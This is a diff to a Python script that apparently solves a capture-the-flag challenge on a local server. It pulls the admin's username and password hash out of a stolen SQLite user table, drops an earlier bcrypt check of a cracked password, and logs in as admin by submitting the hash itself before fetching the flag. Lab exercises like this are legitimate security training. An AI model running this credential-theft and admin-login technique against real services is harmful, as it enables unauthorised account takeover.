@@ -2,7 +2,6 @@
 import requests
 import tempfile
 import sqlite3
-import bcrypt
 
 url = "http://localhost:8000"
 
@@ -27,12 +26,9 @@ with requests.Session() as s:
             cur.execute("SELECT username, password FROM users WHERE is_admin = 1")
             uname, passwdh = cur.fetchone()
 
-    assert bcrypt.checkpw("tokyodrift".encode(), passwdh.encode())
-    print("Password cracked!")
-
     # Get flag
     # Login
-    r = s.post(url + "/login", data={"username": uname, "password": "tokyodrift"})
+    r = s.post(url + "/login", data={"username": uname, "password": passwdh})
     assert r.status_code == 200, r.text
     print("Logged in as admin!")
 
